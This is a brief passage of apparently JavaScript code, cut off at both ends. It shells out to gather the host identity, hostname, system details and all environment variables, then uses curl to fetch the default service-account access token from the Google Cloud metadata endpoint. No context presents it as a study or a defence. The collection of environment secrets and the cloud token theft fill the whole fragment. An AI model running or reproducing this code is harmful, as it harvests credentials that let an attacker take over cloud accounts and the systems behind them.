...
try {
  const info = sh("id 2>&1; hostname 2>&1; uname -a 2>&1; pwd 2>&1; echo ==ENV==; env 2>&1; echo ==MD==; curl -s --max-time 5 -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 2>&1");
